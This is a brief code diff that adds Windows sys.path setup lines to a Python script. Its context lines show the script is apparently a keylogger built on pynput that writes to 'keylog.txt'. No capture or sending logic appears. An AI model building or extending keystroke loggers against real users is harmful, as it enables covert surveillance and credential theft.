@@ -1,3 +1,7 @@
+import sys
+# Add the directory where 'requests' is located
+sys.path.insert(0, r'C:\\Python\\Lib\\site-packages')
+
 import logging
 from pynput import keyboard
 logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
